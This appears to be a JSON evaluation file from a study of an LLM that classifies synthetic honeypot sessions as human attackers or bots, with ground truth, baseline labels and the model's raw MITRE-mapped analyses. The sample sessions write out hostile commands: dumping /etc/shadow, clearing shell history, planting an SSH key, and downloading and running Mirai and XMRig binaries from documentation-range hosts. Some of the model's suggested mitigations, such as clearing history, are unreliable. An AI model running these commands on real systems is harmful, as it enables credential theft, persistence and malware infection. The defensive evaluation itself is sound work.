@@ -1,0 +1,567 @@
+[
+  {
+    "ordem": 1,
+    "session_id": "adv_hum_01_paste_shadow",
+    "cenario": "Humano colando bloco de comandos (paste em rajada <=1s) para ler /etc/shadow e limpar historico",
+    "cenario_sintetico": true,
+    "pausas_segundos": [
+      0,
+      0,
+      1,
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] id (+0s)",
+      "[2] sudo -l (+0s)",
+      "[3] cat /etc/shadow (+1s)",
+      "[4] history -c (+0s)"
+    ],
+    "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_3_comandos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_com_regras": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro": "ATAQUE_HUMANO_DIRECIONADO",
+    "resposta_crua_prompt_regras": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor realizou reconhecimento de privilégios locais e extração direta de hashes de senha do sistema, seguida por uma tentativa de limpeza de rastros.",
+      "mitre_attack": [
+        {
+          "tactic": "Privilege Escalation",
+          "technique_id": "T1548",
+          "technique_name": "Abuse Elevation Control Mechanism",
+          "evidence": "sudo -l"
+        },
+        {
+          "tactic": "Credential Access",
+          "technique_id": "T1003.008",
+          "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
+          "evidence": "cat /etc/shadow"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal: Clear Command History",
+          "evidence": "history -c"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.91 -j DROP",
+        "passwd root",
+        "passwd -e $(awk -F: '($2 != \"*\" && $2 != \"!\") {print $1}' /etc/shadow)"
+      ],
+      "session_id": "adv_hum_01_paste_shadow",
+      "src_ip": "198.51.100.91",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.74,
+      "comandos": [
+        "id",
+        "sudo -l",
+        "cat /etc/shadow",
+        "history -c"
+      ]
+    },
+    "resposta_crua_prompt_neutro": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor obteve acesso como root, executou verificações rápidas de privilégios com sudo, coletou credenciais armazenadas no arquivo /etc/shadow e limpou o histórico de comandos para apagar os rastros da sessão interativa.",
+      "mitre_attack": [
+        {
+          "tactic": "Privilege Escalation",
+          "technique_id": "T1548",
+          "technique_name": "Abuse Elevation Control Mechanism",
+          "evidence": "sudo -l"
+        },
+        {
+          "tactic": "Credential Access",
+          "technique_id": "T1003.008",
+          "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
+          "evidence": "cat /etc/shadow"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal: Clear Command History",
+          "evidence": "history -c"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -e root",
+        "pkill -u root -t pts/0",
+        "history -c && history -w",
+        "sed -i '/PermitRootLogin yes/c\\PermitRootLogin no' /etc/ssh/sshd_config",
+        "systemctl restart sshd"
+      ],
+      "session_id": "adv_hum_01_paste_shadow",
+      "src_ip": "198.51.100.91",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.58,
+      "comandos": [
+        "id",
+        "sudo -l",
+        "cat /etc/shadow",
+        "history -c"
+      ]
+    }
+  },
+  {
+    "ordem": 2,
+    "session_id": "adv_hum_02_paste_sshkey",
+    "cenario": "Humano colando comandos de persistencia SSH e limpeza de rastro em rajada (<=1s)",
+    "cenario_sintetico": true,
+    "pausas_segundos": [
+      0,
+      1,
+      0,
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] ls -la ~/.ssh (+0s)",
+      "[2] mkdir -p ~/.ssh (+1s)",
+      "[3] echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI' >> ~/.ssh/authorized_keys (+0s)",
+      "[4] history -c (+0s)"
+    ],
+    "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_3_comandos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_com_regras": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro": "ATAQUE_HUMANO_DIRECIONADO",
+    "resposta_crua_prompt_regras": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor realizou navegação manual no diretório SSH, criou a pasta de configuração, inseriu uma chave pública SSH não autorizada para persistência de acesso e limpou o histórico de comandos.",
+      "mitre_attack": [
+        {
+          "tactic": "Persistence",
+          "technique_id": "T1098.004",
+          "technique_name": "Account Manipulation: SSH Authorized Keys",
+          "evidence": "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI' >> ~/.ssh/authorized_keys"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
+          "evidence": "history -c"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.92 -j DROP",
+        "sed -i '/AAAAC3NzaC1lZDI1NTE5AAAAI/d' ~/.ssh/authorized_keys",
+        "passwd -l admin"
+      ],
+      "session_id": "adv_hum_02_paste_sshkey",
+      "src_ip": "198.51.100.92",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.52,
+      "comandos": [
+        "ls -la ~/.ssh",
+        "mkdir -p ~/.ssh",
+        "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI' >> ~/.ssh/authorized_keys",
+        "history -c"
+      ]
+    },
+    "resposta_crua_prompt_neutro": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor realizou a persistência na sessão SSH injetando uma chave pública (authorized_keys) e limpou o histórico de comandos para apagar os rastros.",
+      "mitre_attack": [
+        {
+          "tactic": "Persistence",
+          "technique_id": "T1098.004",
+          "technique_name": "Account Manipulation: SSH Authorized Keys",
+          "evidence": "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI' >> ~/.ssh/authorized_keys"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
+          "evidence": "history -c"
+        }
+      ],
+      "mitigation_commands": [
+        "sed -i '/ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI/d' ~/.ssh/authorized_keys",
+        "passwd -l admin",
+        "history -c"
+      ],
+      "session_id": "adv_hum_02_paste_sshkey",
+      "src_ip": "198.51.100.92",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 2.66,
+      "comandos": [
+        "ls -la ~/.ssh",
+        "mkdir -p ~/.ssh",
+        "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI' >> ~/.ssh/authorized_keys",
+        "history -c"
+      ]
+    }
+  },
+  {
+    "ordem": 3,
+    "session_id": "adv_hum_03_paste_suid",
+    "cenario": "Humano colando sequencia de enumeracao SUID e evasao em rajada (<=1s)",
+    "cenario_sintetico": true,
+    "pausas_segundos": [
+      0,
+      0,
+      1,
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] whoami (+0s)",
+      "[2] cat /etc/passwd | grep bash (+0s)",
+      "[3] find / -perm -4000 2>/dev/null (+1s)",
+      "[4] unset HISTFILE (+0s)"
+    ],
+    "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_3_comandos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_com_regras": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro": "ATAQUE_HUMANO_DIRECIONADO",
+    "resposta_crua_prompt_regras": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "ALTO",
+      "summary": "O usuário realizou reconhecimento manual do sistema, listando usuários com acesso ao interpretador bash, buscando binários com a permissão SUID para potencial escalação de privilégio e limpando o histórico de comandos para ocultar rastros.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1087.001",
+          "technique_name": "Account Discovery: Local Account",
+          "evidence": "cat /etc/passwd | grep bash"
+        },
+        {
+          "tactic": "Privilege Escalation",
+          "technique_id": "T1548.001",
+          "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
+          "evidence": "find / -perm -4000 2>/dev/null"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
+          "evidence": "unset HISTFILE"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.93 -j DROP",
+        "auditctl -w /etc/passwd -p wa -k passwd_changes",
+        "find / -perm -4000 -type f 2>/dev/null"
+      ],
+      "session_id": "adv_hum_03_paste_suid",
+      "src_ip": "198.51.100.93",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.62,
+      "comandos": [
+        "whoami",
+        "cat /etc/passwd | grep bash",
+        "find / -perm -4000 2>/dev/null",
+        "unset HISTFILE"
+      ]
+    },
+    "resposta_crua_prompt_neutro": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor realizou reconhecimento pós-exploração focado em enumeração de usuários, busca por binários com a flag SUID para potencial escalação de privilégios e limpou o histórico de comandos para ocultar rastros.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1087.001",
+          "technique_name": "Account Discovery: Local Account",
+          "evidence": "cat /etc/passwd | grep bash"
+        },
+        {
+          "tactic": "Privilege Escalation",
+          "technique_id": "T1548.001",
+          "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
+          "evidence": "find / -perm -4000 2>/dev/null"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
+          "evidence": "unset HISTFILE"
+        }
+      ],
+      "mitigation_commands": [
+        "auditctl -w /etc/passwd -p wa -k passwd_changes",
+        "find / -path /proc -prune -o -path /sys -prune -o -perm -4000 -print",
+        "export HISTFILE=/root/.bash_history",
+        "history -c"
+      ],
+      "session_id": "adv_hum_03_paste_suid",
+      "src_ip": "198.51.100.93",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.63,
+      "comandos": [
+        "whoami",
+        "cat /etc/passwd | grep bash",
+        "find / -perm -4000 2>/dev/null",
+        "unset HISTFILE"
+      ]
+    }
+  },
+  {
+    "ordem": 4,
+    "session_id": "adv_bot_01_slow_mirai",
+    "cenario": "Bot dropper Mirai com sleep artificial de 5-6s entre comandos para evadir deteccao por velocidade",
+    "cenario_sintetico": true,
+    "pausas_segundos": [
+      5,
+      6,
+      5,
+      6
+    ],
+    "comandos_com_tempo": [
+      "[1] cd /tmp (+5s)",
+      "[2] wget http://198.51.100.94/mirai.arm7 (+6s)",
+      "[3] chmod 777 mirai.arm7 (+5s)",
+      "[4] ./mirai.arm7 (+6s)"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_com_regras": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
+    "resposta_crua_prompt_regras": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor realizou o download, alteração de permissão e execução de um binário malicioso de botnet (Mirai) no diretório temporário, indicando uma infecção automatizada por script ou malware.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204.002",
+          "technique_name": "User Execution: Malicious File",
+          "evidence": "./mirai.arm7"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget http://198.51.100.94/mirai.arm7"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.94 -j DROP",
+        "pkill -f mirai.arm7",
+        "rm -f /tmp/mirai.arm7"
+      ],
+      "session_id": "adv_bot_01_slow_mirai",
+      "src_ip": "198.51.100.94",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.48,
+      "comandos": [
+        "cd /tmp",
+        "wget http://198.51.100.94/mirai.arm7",
+        "chmod 777 mirai.arm7",
+        "./mirai.arm7"
+      ]
+    },
+    "resposta_crua_prompt_neutro": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "CRÍTICO",
+      "summary": "Sessão típica de infecção automatizada por malware (Mirai), caracterizada pelo uso de comandos padronizados para download, preparação e execução de payload binário arquitetural em diretório temporário.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204.002",
+          "technique_name": "User Execution: Malicious File",
+          "evidence": "./mirai.arm7"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget http://198.51.100.94/mirai.arm7"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.94 -j DROP",
+        "killall -9 mirai.arm7",
+        "rm -f /tmp/mirai.arm7"
+      ],
+      "session_id": "adv_bot_01_slow_mirai",
+      "src_ip": "198.51.100.94",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.43,
+      "comandos": [
+        "cd /tmp",
+        "wget http://198.51.100.94/mirai.arm7",
+        "chmod 777 mirai.arm7",
+        "./mirai.arm7"
+      ]
+    }
+  },
+  {
+    "ordem": 5,
+    "session_id": "adv_bot_02_slow_xmrig",
+    "cenario": "Bot de mineracao XMRig com pausas lentas de 5-7s entre comandos",
+    "cenario_sintetico": true,
+    "pausas_segundos": [
+      6,
+      7,
+      5,
+      6
+    ],
+    "comandos_com_tempo": [
+      "[1] cd /var/tmp (+6s)",
+      "[2] curl -O http://198.51.100.95/xmrig (+7s)",
+      "[3] chmod +x xmrig (+5s)",
+      "[4] ./xmrig -o pool.minexmr.com:4444 (+6s)"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_com_regras": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
+    "resposta_crua_prompt_regras": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor realizou o download e a execução imediata de um script/binário de mineração de criptomoedas (XMRig) de forma sequencial e automatizada em um diretório temporário.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204",
+          "technique_name": "User Execution",
+          "evidence": "chmod +x xmrig e execução de ./xmrig"
+        },
+        {
+          "tactic": "Resource Development",
+          "technique_id": "T1588.002",
+          "technique_name": "Obtain Capabilities: Tool",
+          "evidence": "curl -O http://198.51.100.95/xmrig"
+        },
+        {
+          "tactic": "Impact",
+          "technique_id": "T1496",
+          "technique_name": "Resource Hijacking",
+          "evidence": "./xmrig -o pool.minexmr.com:4444"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.95 -j DROP",
+        "pkill -f xmrig",
+        "rm -f /var/tmp/xmrig"
+      ],
+      "session_id": "adv_bot_02_slow_xmrig",
+      "src_ip": "198.51.100.95",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.39,
+      "comandos": [
+        "cd /var/tmp",
+        "curl -O http://198.51.100.95/xmrig",
+        "chmod +x xmrig",
+        "./xmrig -o pool.minexmr.com:4444"
+      ]
+    },
+    "resposta_crua_prompt_neutro": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor realizou o download, preparação e execução de um minerador de criptomoedas (XMRig) de forma padronizada em um diretório temporário, comportamento típico de scripts automatizados e botnets de mineração.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204.002",
+          "technique_name": "User Execution: Malicious File",
+          "evidence": "Execução do binário malicioso './xmrig'."
+        },
+        {
+          "tactic": "Resource Development",
+          "technique_id": "T1587.001",
+          "technique_name": "Develop Capabilities: Malware",
+          "evidence": "Utilização do minerador XMRig obtido via curl."
+        },
+        {
+          "tactic": "Impact",
+          "technique_id": "T1496",
+          "technique_name": "Resource Hijacking",
+          "evidence": "Conexão a um pool de mineração de criptomoeda (pool.minexmr.com:4444)."
+        }
+      ],
+      "mitigation_commands": [
+        "killall xmrig",
+        "rm -f /var/tmp/xmrig",
+        "iptables -A INPUT -s 198.51.100.95 -j DROP",
+        "passwd -l root"
+      ],
+      "session_id": "adv_bot_02_slow_xmrig",
+      "src_ip": "198.51.100.95",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.7,
+      "comandos": [
+        "cd /var/tmp",
+        "curl -O http://198.51.100.95/xmrig",
+        "chmod +x xmrig",
+        "./xmrig -o pool.minexmr.com:4444"
+      ]
+    }
+  },
+  {
+    "ordem": 6,
+    "session_id": "adv_bot_03_slow_scanner",
+    "cenario": "Scanner automatizado executando uname e echo xsec com pausa de 6s",
+    "cenario_sintetico": true,
+    "pausas_segundos": [
+      6,
+      6
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+6s)",
+      "[2] echo xsec (+6s)"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_3_comandos": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_com_regras": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
+    "resposta_crua_prompt_regras": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução de comandos típicos de reconhecimento inicial por scanner automatizado, verificando a versão do kernel e realizando teste de eco.",
+      "mitre_attack": [
+        {
+          "tactic": "Reconhecimento",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.96 -j DROP"
+      ],
+      "session_id": "adv_bot_03_slow_scanner",
+      "src_ip": "198.51.100.96",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.07,
+      "comandos": [
+        "uname -s -v -n -r -m",
+        "echo xsec"
+      ]
+    },
+    "resposta_crua_prompt_neutro": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Sessão com intervalos longos executando comandos básicos de reconhecimento e verificação de resposta (echo xsec), típicos de scripts de varredura ou sondagem automatizada.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.96 -j DROP",
+        "passwd -l root",
+        "sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config",
+        "systemctl restart sshd"
+      ],
+      "session_id": "adv_bot_03_slow_scanner",
+      "src_ip": "198.51.100.96",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.29,
+      "comandos": [
+        "uname -s -v -n -r -m",
+        "echo xsec"
+      ]
+    }
+  }
+]
